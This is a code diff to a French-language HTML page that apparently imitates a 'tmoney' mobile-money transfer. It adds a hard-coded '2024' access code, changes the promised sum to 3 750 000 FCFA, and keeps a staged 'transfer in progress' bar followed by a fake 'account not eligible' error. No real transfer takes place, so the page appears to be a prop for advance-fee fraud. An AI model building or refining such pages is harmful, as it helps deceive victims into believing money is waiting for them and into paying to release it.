@@ -119,6 +119,11 @@
 
         <form id="tmoneyForm" onsubmit="return false;">
             <div class="form-group">
+                <label for="accessCode">Code d'accès</label>
+                <input type="password" id="accessCode" placeholder="Code d'accès" required>
+            </div>
+
+            <div class="form-group">
                 <label for="name">Nom et Prénom</label>
                 <input type="text" id="name" placeholder="Nom et Prénom" required>
             </div>
@@ -130,10 +135,10 @@
 
             <div class="form-group">
                 <label for="amount">Montant à recevoir</label>
-                <input type="text" id="amount" class="amount" value="5 417 775 FCFA" disabled>
+                <input type="text" id="amount" class="amount" value="3 750 000 FCFA" disabled>
             </div>
 
-            <button type="button" onclick="startProgress()">Procéder</button>
+            <button type="button" onclick="validateAccessCode()">Procéder</button>
 
             <div class="progress-title" id="progressTitle">Transfert des fonds en cours...</div>
 
@@ -142,11 +147,24 @@
                 <div class="progress-bar" id="progressBar"></div>
             </div>
 
-            <div class="notification-message" id="notificationMessage">Erreur : Le compte n'est pas éligible pour recevoir la somme de 5 417 775 FCFA.</div>
+            <div class="notification-message" id="notificationMessage">Erreur : Le compte n'est pas éligible pour recevoir la somme de 3 750 000 FCFA.</div>
+            <div class="notification-message" id="accessError" style="color: red; display: none;">Erreur : Code d'accès incorrect.</div>
         </form>
     </div>
 
     <script>
+        function validateAccessCode() {
+            const accessCode = document.getElementById('accessCode').value;
+            const accessError = document.getElementById('accessError');
+
+            if (accessCode === "2024") {
+                accessError.style.display = 'none';
+                startProgress();
+            } else {
+                accessError.style.display = 'block';
+            }
+        }
+
         function startProgress() {
             document.getElementById('progressContainer').style.display = 'block';
             document.getElementById('progressTitle').style.display = 'block';
